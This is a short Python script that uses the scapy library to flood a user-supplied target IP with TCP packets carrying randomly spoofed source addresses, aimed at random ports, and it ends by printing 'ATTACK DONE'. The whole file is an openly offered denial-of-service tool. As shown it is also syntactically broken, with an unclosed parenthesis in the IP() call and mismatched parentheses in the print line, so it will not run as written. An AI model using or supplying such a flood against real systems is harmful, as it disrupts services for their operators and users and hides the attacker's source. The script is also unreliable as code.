#! /usr/bin/env python
import scapy.all as scapy
import random

#source_port = int(input("Source port: "))
source_port = 135

target_ip = input("Target IP address: ")

#target_port = int(input("Target port: "))
target_port = 80
e = int(input("Send packets: "))
i = 1
while i <= e:
    i1 = str(random.randint(1,254))
    i2 = str(random.randint(1,254))
    i3 = str(random.randint(1,254))
    i4 = str(random.randint(1,254))
    d = "."
    source_ip = i1+d+i2+d+i3+d+i4
    target_port = random.randint(50, 135)
    IP1 = scapy.IP(src = source_ip, dst = str(target_ip)
    TCP = scapy.TCP(sport = source_port, dport = target_port)
    pkt = IP1 / TCP

    scapy.send(pkt, inter = .001)
    print("[#] Packet send ", i) ,'| Fake Source ip: ', source_ip , end='\r')

    i = i + 1


print("ATTACK DONE...")